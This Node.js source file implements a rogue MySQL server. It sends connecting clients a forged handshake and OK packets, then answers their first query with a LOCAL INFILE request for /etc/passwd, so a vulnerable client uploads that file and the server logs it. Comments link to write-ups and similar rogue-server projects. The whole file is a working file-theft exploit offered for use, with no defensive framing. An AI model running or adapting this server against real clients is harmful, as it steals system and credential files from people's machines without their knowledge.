const net = require('net')
const pad = require('left-pad')

const PORT = 3306
const FILENAME = '/etc/passwd'

/**
 * https://lightless.me/archives/read-mysql-client-file.html
 * https://xz.aliyun.com/t/3277
 * https://dev.mysql.com/doc/internals/en/com-query-response.html
 * https://github.com/allyshka/Rogue-MySql-Server
 * https://github.com/Gifts/Rogue-MySql-Server
 */

const RESPONSE = {
  GREATING: '5b0000000a352e362e32382d307562756e7475302e31342e30342e31002d000000403f59264b2b346000fff70802007f8015000000000000000000006869595f525f635560645352006d7973716c5f6e61746976655f70617373776f726400',
  FIRST_OK: '0700000200000002000000',
  SECOND_OK: '0700000400000002000000',
}

const STATE = {
  WAITING_FOR_GREATING: 0,
  WAITING_FOR_FIRST_OK: 1,
  WAITING_FOR_QUERY: 2,
  WAITING_FOR_SECOND_OK: 3,
  OVER: -1,
}

const server = net.createServer((socket) => {
  console.log('----- Client connected from %s:%s', socket.remoteAddress, socket.remotePort)

  const write = (name, content) => {
    if (typeof content === 'undefined') {
      content = Buffer.from(RESPONSE[name], 'hex')
    }
    console.log(`Send:---\n${name}\n---`)
    socket.write(content)
  }

  let state = STATE.WAITING_FOR_GREATING

  write('GREATING')
  state = STATE.WAITING_FOR_FIRST_OK

  socket.on('data', (data) => {
    console.log('Received data:---\n%s\n---\n%s\n---', data.toString('hex'), data.toString())
    console.log('State:---\n%s\n---', state)
    switch (state) {
      case STATE.WAITING_FOR_FIRST_OK: {
        write('FIRST_OK')
        state = STATE.WAITING_FOR_QUERY
        break
      }
      case STATE.WAITING_FOR_QUERY: {
        let filename = Buffer.from(FILENAME)
        let payload = Buffer.from([
          pad((filename.length + 1).toString(16), 2, '0'),
          '000001fb',
          filename.toString('hex'),
        ].join(''), 'hex')
        write('QUERY', payload)
        state = STATE.WAITING_FOR_SECOND_OK
        break
      }
      case STATE.WAITING_FOR_SECOND_OK: {
        write('SECOND_OK')
        state = STATE.OVER
        break
      }
      case STATE.OVER: {
        write('SECOND_OK')
        // socket.end('goodbye\n')
        break
      }
      default: {
        throw new Error('Unexpected state')
      }
    }
  })
}).on('error', (err) => {
  throw err
})

server.listen(PORT, () => {
  console.log('opened server on', server.address())
})
